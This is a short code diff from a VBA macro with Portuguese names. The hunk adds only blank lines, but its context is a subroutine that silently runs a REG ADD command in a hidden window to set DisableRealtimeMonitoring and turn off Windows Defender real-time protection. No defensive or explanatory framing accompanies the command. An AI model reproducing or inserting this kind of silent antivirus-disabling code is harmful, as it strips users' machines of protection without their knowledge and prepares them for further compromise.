@@ -37,3 +37,5 @@ Sub DesabilitarRealTimeDefender()
     Retorno = shellTemporario.Run("REG ADD ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d 1 /f", 0, True)
 
 End Sub
+
+
